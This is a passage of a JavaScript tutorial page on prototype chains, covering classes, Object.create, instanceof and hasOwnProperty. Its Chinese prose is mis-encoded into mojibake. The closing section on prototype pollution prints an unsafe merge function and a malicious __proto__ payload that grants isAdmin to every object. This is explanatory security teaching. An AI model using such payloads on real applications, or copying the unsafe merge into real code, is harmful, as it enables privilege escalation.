id="5-4-ES6-class-è¯­æ³•ä¸åŸå‹é“¾çš„å…³ç³»"><a href="#5-4-ES6-class-è¯­æ³•ä¸åŸå‹é“¾çš„å…³ç³»" class="headerlink" title="5.4 ES6Â classÂ è¯­æ³•ä¸åŸå‹é“¾çš„å…³ç³»"></a>5.4 ES6Â <code>class</code>Â è¯­æ³•ä¸åŸå‹é“¾çš„å…³ç³»</h2><p><strong>ä»£ç å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>  <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, breed</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;<br>  &#125;<br>  <br>  <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>, <span class="hljs-string">&#x27;Golden Retriever&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><ul><li>è¿™æœ¬è´¨ä¸Šæ˜¯è¯­æ³•ç³–ï¼Œåº•å±‚ä»ç„¶æ˜¯åŸºäºåŸå‹çš„ç»§æ‰¿</li><li>extends å…³é”®å­—è‡ªåŠ¨è®¾ç½®äº†åŸå‹é“¾</li><li>super() å¿…é¡»åœ¨ä½¿ç”¨ this ä¹‹å‰è°ƒç”¨</li></ul><h1 id="ç¬¬å…­ç« ï¼šåŸå‹ç›¸å…³æ–¹æ³•ä¸æ“ä½œ"><a href="#ç¬¬å…­ç« ï¼šåŸå‹ç›¸å…³æ–¹æ³•ä¸æ“ä½œ" class="headerlink" title="ç¬¬å…­ç« ï¼šåŸå‹ç›¸å…³æ–¹æ³•ä¸æ“ä½œ"></a>ç¬¬å…­ç« ï¼šåŸå‹ç›¸å…³æ–¹æ³•ä¸æ“ä½œ</h1><h2 id="6-1-Object-create-ä¸çº¯å‡€å¯¹è±¡"><a href="#6-1-Object-create-ä¸çº¯å‡€å¯¹è±¡" class="headerlink" title="6.1Â Object.create()Â ä¸çº¯å‡€å¯¹è±¡"></a>6.1Â <code>Object.create()</code>Â ä¸çº¯å‡€å¯¹è±¡</h2><p>Object.create æ˜¯ JavaScript ä¸­åˆ›å»ºæ–°å¯¹è±¡çš„æ–¹æ³•ï¼Œå®ƒå…è®¸ä½ æ˜ç¡®æŒ‡å®šæ–°å¯¹è±¡çš„åŸå‹</p><p><strong>åŸºæœ¬è¯­æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto[, propertiesObject])<br></code></pre></td></tr></table></figure><ul><li>protoï¼šæ–°åˆ›å»ºå¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼ˆå¿…é¡»ä¸ºå¯¹è±¡æˆ– nullï¼‰</li><li>propertiesObjectï¼ˆå¯é€‰ï¼‰ï¼šå±æ€§æè¿°ç¬¦é›†åˆï¼ˆåŒ Object.defineProperties() çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰</li></ul><p><strong>çº¯å‡€å¯¹è±¡</strong></p><p>çº¯å‡€å¯¹è±¡æ˜¯æŒ‡æ²¡æœ‰åŸå‹é“¾ï¼ˆ<code>__proto__</code>ä¸º nullï¼‰çš„å¯¹è±¡ï¼Œåˆ›å»ºæ–¹å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> pureObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>å…¶ç‰¹ç‚¹æœ‰ï¼š</p><ul><li>æ— åŸå‹ï¼Œé˜²æ­¢æ±¡æŸ“</li><li>æ— ä»»ä½•é»˜è®¤å±æ€§å’Œæ–¹æ³•</li><li>å±æ€§æŸ¥æ‰¾æ›´å¿«ï¼Œåªéœ€æŸ¥æ‰¾è‡ªèº«å±æ€§</li><li>æ›´å®‰å…¨çš„å±æ€§å­˜å‚¨</li></ul><h2 id="6-2-Object-getPrototypeOf-å’Œ-Object-setPrototypeOf"><a href="#6-2-Object-getPrototypeOf-å’Œ-Object-setPrototypeOf" class="headerlink" title="6.2Â Object.getPrototypeOf()Â å’ŒÂ Object.setPrototypeOf()"></a>6.2Â <code>Object.getPrototypeOf()</code>Â å’ŒÂ <code>Object.setPrototypeOf()</code></h2><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><ul><li>Object.getPrototypeOf() æ–¹æ³•ç”¨äºè·å–æŒ‡å®šå¯¹è±¡çš„åŸå‹ï¼ˆå³å†…éƒ¨ [[Prototype]] å±æ€§çš„å€¼ï¼‰</li><li>Object.setPrototypeOf() æ–¹æ³•è®¾ç½®ä¸€ä¸ªæŒ‡å®šå¯¹è±¡çš„åŸå‹ï¼ˆå³å†…éƒ¨ [[Prototype]] å±æ€§ï¼‰åˆ°å¦ä¸€ä¸ªå¯¹è±¡æˆ– nullã€‚</li></ul><p><strong>è¯­æ³•å’Œå‚æ•°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj)<br><span class="hljs-comment">// objï¼šè¦è·å–å…¶åŸå‹çš„å¯¹è±¡ï¼Œæ³¨æ„ï¼Œå¦‚æœå‚æ•°ä¸æ˜¯å¯¹è±¡ï¼Œä¼šå¼ºåˆ¶è½¬ä¸ºå¯¹è±¡</span><br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, prototype)<br><span class="hljs-comment">// objï¼šè¦è®¾ç½®å…¶åŸå‹çš„å¯¹è±¡</span><br><span class="hljs-comment">// prototypeï¼šè¯¥å¯¹è±¡çš„æ–°åŸå‹ï¼ˆå¿…é¡»ä¸ºå¯¹è±¡æˆ– nullï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>è¿”å›å€¼</strong></p><ul><li>Object.getPrototypeOf()ï¼šè¿”å›ç»™å®šå¯¹è±¡çš„åŸå‹ï¼ˆå¯èƒ½æ˜¯å¯¹è±¡æˆ– nullï¼‰</li><li>Object.setPrototypeOf()ï¼šè¿”å›è®¾ç½®æ–°åŸå‹åçš„å¯¹è±¡</li></ul><h2 id="6-3-instanceof-çš„åŸç†ä¸å±€é™æ€§"><a href="#6-3-instanceof-çš„åŸç†ä¸å±€é™æ€§" class="headerlink" title="6.3Â instanceofÂ çš„åŸç†ä¸å±€é™æ€§"></a>6.3Â <code>instanceof</code>Â çš„åŸç†ä¸å±€é™æ€§</h2><p>instanceof æ˜¯ JavaScript ä¸­ç”¨äºæ£€æŸ¥å¯¹è±¡åŸå‹é“¾çš„æ“ä½œç¬¦ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯æ£€æŸ¥æ„é€ å‡½æ•°çš„ prototype å±æ€§æ˜¯å¦å‡ºç°åœ¨å¯¹è±¡çš„åŸå‹é“¾ä¸Š</p><p><strong>è¯­æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">object <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span><br></code></pre></td></tr></table></figure><p><strong>å†…éƒ¨å®ç°æœºåˆ¶</strong></p><p>instanceof çš„åº•å±‚è¡Œä¸ºå¯ä»¥ç”¨ä»¥ä¸‹ä¼ªä»£ç è¡¨ç¤ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">instanceOf</span>(<span class="hljs-params">obj, Constructor</span>) &#123;<br>  <span class="hljs-comment">// è·å–å¯¹è±¡çš„åŸå‹</span><br>  <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);<br>  <br>  <span class="hljs-comment">// è·å–æ„é€ å‡½æ•°çš„ prototype å¯¹è±¡</span><br>  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;<br>  <br>  <span class="hljs-comment">// æ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾</span><br>  <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (proto === prototype) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å®é™…ç¤ºä¾‹åˆ†æ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>å…¶æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼š</p><ol><li>è·å– <code>p.__proto__</code>ï¼ˆæŒ‡å‘ Person.prototypeï¼‰</li><li>æ¯”è¾ƒ Person.prototype å’Œ Person.prototype -&gt; åŒ¹é…æˆåŠŸ</li></ol><p><strong>ä¸»è¦å±€é™æ€§</strong></p><p>ï¼ˆ1ï¼‰è·¨æ‰§è¡Œç¯å¢ƒé—®é¢˜ï¼ˆiframe&#x2F;windowï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;!-- ä¸»é¡µé¢ --&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();</span></span><br><span class="language-javascript"><span class="language-xml">  </span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-comment">// åˆ›å»ºiframeå¹¶è·å–å…¶Arrayæ„é€ å‡½æ•°</span></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(iframe);</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-keyword">const</span> <span class="hljs-title class_">IframeArray</span> = iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-property">Array</span>;</span></span><br><span class="language-javascript"><span class="language-xml">  </span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">IframeArray</span>); <span class="hljs-comment">// false</span></span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>åŸå› ï¼šä¸åŒæ‰§è¡Œç¯å¢ƒæœ‰å…¶å„è‡ªç‹¬ç«‹çš„å…¨å±€å¯¹è±¡å’Œæ„é€ å‡½æ•°</p><p>ï¼ˆ2ï¼‰åŸå§‹ç±»å‹æ£€æµ‹ä¸å¯é </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">123</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Number</span>);    <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">true</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Boolean</span>);  <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>åŸå› ï¼šåŸå§‹ç±»å‹ä¸æ˜¯å¯¹è±¡ï¼Œé™¤éç”¨åŒ…è£…å¯¹è±¡</p><p>ï¼ˆ3ï¼‰æ„é€ å‡½æ•° prototype è¢«ä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-comment">// ä¿®æ”¹åŸå‹å</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰å¯¹è±¡åŸå‹è¢«æ‰‹åŠ¨ä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_">A</span>();<br><br><span class="hljs-comment">// ä¿®æ”¹åŸå‹é“¾</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> A); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> B); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰å¯¹çº¯å‡€å¯¹è±¡æ— æ•ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> pureObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pureObj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="6-4-hasOwnProperty-ä¸-in-æ“ä½œç¬¦çš„åŒºåˆ«"><a href="#6-4-hasOwnProperty-ä¸-in-æ“ä½œç¬¦çš„åŒºåˆ«" class="headerlink" title="6.4Â hasOwnPropertyÂ ä¸Â inÂ æ“ä½œç¬¦çš„åŒºåˆ«"></a>6.4Â <code>hasOwnProperty</code>Â ä¸Â <code>in</code>Â æ“ä½œç¬¦çš„åŒºåˆ«</h2><p><strong>æ ¸å¿ƒåŒºåˆ«</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">hasOwnProperty</th><th align="left">in æ“ä½œç¬¦</th></tr></thead><tbody><tr><td align="left">æ£€æµ‹èŒƒå›´</td><td align="left">ä»…å¯¹è±¡è‡ªèº«å±æ€§</td><td align="left">è‡ªèº«å±æ€§ + åŸå‹é“¾å±æ€§</td></tr><tr><td align="left">ç»§æ‰¿æ–¹æ³•</td><td align="left">æ¥è‡ª Object.prototype</td><td align="left">JavaScript è¯­è¨€æ“ä½œç¬¦</td></tr><tr><td align="left">å¯¹çº¯å‡€å¯¹è±¡</td><td align="left">éœ€è¦å¤–éƒ¨è°ƒç”¨ï¼ˆObject.prototype.hasOwnProperty.callï¼‰</td><td align="left">å¯ç›´æ¥ä½¿ç”¨</td></tr><tr><td align="left">ES6+æ›¿ä»£æ–¹æ¡ˆ</td><td align="left">Object.hasOwn()</td><td align="left">Reflect.has()</td></tr></tbody></table><p><strong>æ·±åº¦è§£æ</strong></p><p>ï¼ˆ1ï¼‰hasOwnProperty å®ç°åŸç†ï¼ˆä¼ªä»£ç ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-comment">// è·å–å¯¹è±¡çš„æ‰€æœ‰è‡ªæœ‰å±æ€§</span><br>  <span class="hljs-keyword">const</span> ownKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj).<span class="hljs-title function_">concat</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj));<br>  <span class="hljs-keyword">return</span> ownKeys.<span class="hljs-title function_">includes</span>(prop);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰in æ“ä½œç¬¦å®ç°åŸç†ï¼ˆä¼ªä»£ç ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inOperator</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-keyword">while</span> (obj !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, prop)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®å·®å¼‚å¯¹æ¯”</strong></p><p>ï¼ˆ1ï¼‰åŸå‹é“¾å¤„ç†å·®å¼‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;Proto&#x27;</span>;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> p);             <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å±æ€§æè¿°ç¬¦å½±å“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123;&#125;;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(parent, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;secret&#x27;</span>)); <span class="hljs-comment">// false â—ï¸(æ­£ç¡®ï¼Œéè‡ªæœ‰å±æ€§)</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;secret&#x27;</span> <span class="hljs-keyword">in</span> child);             <span class="hljs-comment">// true â—ï¸(èƒ½æ£€æµ‹åˆ°ç»§æ‰¿å±æ€§)</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬ä¸ƒç« ï¼šé«˜çº§åŸå‹åº”ç”¨"><a href="#ç¬¬ä¸ƒç« ï¼šé«˜çº§åŸå‹åº”ç”¨" class="headerlink" title="ç¬¬ä¸ƒç« ï¼šé«˜çº§åŸå‹åº”ç”¨"></a>ç¬¬ä¸ƒç« ï¼šé«˜çº§åŸå‹åº”ç”¨</h1><h2 id="7-1-åŸå‹æ±¡æŸ“ä¸å®‰å…¨é—®é¢˜"><a href="#7-1-åŸå‹æ±¡æŸ“ä¸å®‰å…¨é—®é¢˜" class="headerlink" title="7.1 åŸå‹æ±¡æŸ“ä¸å®‰å…¨é—®é¢˜"></a>7.1 åŸå‹æ±¡æŸ“ä¸å®‰å…¨é—®é¢˜</h2><p><strong>åŸºæœ¬æ¦‚å¿µ</strong></p><p>åŸå‹æ±¡æŸ“æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼ä¿®æ”¹ JavaScript å¯¹è±¡çš„åŸå‹ï¼ˆé€šå¸¸æ˜¯ Object.prototypeï¼‰ï¼Œä»è€Œå½±å“æ‰€æœ‰åŸºäºè¯¥åŸå‹çš„å¯¹è±¡è¡Œä¸ºçš„å®‰å…¨æ¼æ´</p><p><strong>æ±¡æŸ“åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ­£å¸¸å¯¹è±¡</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;;<br><br><span class="hljs-comment">// æ±¡æŸ“åŸå‹</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>;<br><br><span class="hljs-comment">// æ‰€æœ‰å¯¹è±¡ç°åœ¨éƒ½æœ‰isAdminå±æ€§</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>å¸¸è§çš„æ±¡æŸ“é€”å¾„</strong></p><p>ï¼ˆ1ï¼‰ä¸å®‰å…¨çš„å¯¹è±¡åˆå¹¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> source) &#123;<br>    target[key] = source[key]; <span class="hljs-comment">// å¯èƒ½è¦†ç›–åŸå‹å±æ€§</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> maliciousPayload = &#123;<br>  <span class="hljs-attr">__proto__</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">constructor</span>: &#123; <span class="hljs-attr">prototype</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125; &#125;<br>&#125;;<br><br><span class="hljs-title function_">merge</span>(&#123;&#125;, maliciousPayload);<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä¸å®‰å…¨çš„ JSON è§£æ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 